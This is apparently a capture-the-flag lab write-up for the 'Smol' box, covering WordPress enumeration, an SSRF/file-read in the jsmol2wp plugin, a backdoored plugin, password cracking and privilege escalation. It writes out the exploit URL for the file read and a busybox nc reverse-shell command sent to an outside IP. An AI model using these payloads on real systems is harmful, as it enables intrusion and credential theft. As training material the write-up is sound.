# Smol

I started by enumerating the machine using nmap, this is the output:

![nmap.png](/images/reports/smol/nmap.png)

When accessing the website we are redirected to `www.smol.thm`, in order to access the webpage we need to add this to `/etc/hosts`.

This is the webpage:

![website.png](/images/reports/smol/website.png)

Since it is mentioned in the description of the box and on the webpage as well that this website runs on WordPress I decided to run wpscan to see what I can get out of the enumeration.

![wpscan.png](/images/reports/smol/wpscan.png)

We get 2 vulnerabilities: XSS and SSRF. Going to the wpscan documentation for the SSRF ([https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/](https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/)) we get the proof of concept. By just copying the link given on the page and going to that link we can get to the config file which contain the credentials for wpuser:

![config.png](/images/reports/smol/config.png)

And we get access:

![wppage.png](/images/reports/smol/wppage.png)

Going to pages we get one unpublished page:

![private_page.png](/images/reports/smol/private_page.png)

We can deduce that there is one plugin that can have some interesting code. Since the code is most likely PHP and the name might be hello I tried using the same SSRF attack to get the hello.php page. Using this specific URL I got the code: [http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php](http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php)

![base64.png](/images/reports/smol/base64.png)

What caught my eye was this line that is encoded in base64, using Cyberchef I decoded it:

![decoded.png](/images/reports/smol/decoded.png)

Looking online I found that \143\155\x64 means ‘cmd’. This means we might be able to give a cmd command in order to get the RCE. 

I wen to revshells and got a busybox reverse shell, then URL looks like this:
[http://www.smol.thm/wp-admin/?cmd=busybox nc 192.168.183.50 1234 -e sh](http://www.smol.thm/wp-admin/?cmd=busybox%20nc%20192.168.183.50%201234%20-e%20sh)

This way I got the shell back:

![connection.png](/images/reports/smol/connection.png)

Since we have the credentials for the database we can look at it. This way we might get other user’s credentials in order to find the flag. 

![mysql.png](/images/reports/smol/mysql.png)

![passwords.png](/images/reports/smol/passwords.png)

I then created a txt file with the credentials for each user and used  JohnTheRipper to try and crack the passwords.

![creds.png](/images/reports/smol/creds.png)

I got a hit for Diego:

![diego.png](/images/reports/smol/diego.png)

After switching the user to Diego and looking in to their home directory I found the user flag:

![user flag.png](/images/reports/smol/user_flag.png)

Next, I looked at the user think where I found the SSH private key.

![private key.png](/images/reports/smol/private_key.png)

I used the key to connect to think:

![ssh connection.png](/images/reports/smol/ssh_connection.png)

After connecting to think I looked inside gege’s directory and discovered a zip file that may be worth looking into:

![old zip.png](/images/reports/smol/old_zip.png)

Next I tried switching users to gege from think and it worked without having to authenticate, from what I found only there is a PAM configuration file where it allows the user think to switch to gege without a password. After that, I started a python server where the zip file is located and I transfered the file on my machine:

![wget.png](/images/reports/smol/wget.png)

When trying to extract the archive we find that it is encrypted. Since we don’t know the password we could attempt to crack it using John. First we convert the zip to john using `zip2john` . And then pass it to John to crack it. 

![archive_hash.png](/images/reports/smol/archive_hash.png)

After unziping and looking into the files contained in the worpress.old I’ve read the wp-config.php where the credentials for the user xavi were. 

I switched the user to xavi and looked at what permissions do they have:

![sudo -l.png](sudo_-l.png)

Finally I switched to the root user and got the root flag:

![root.png](root.png)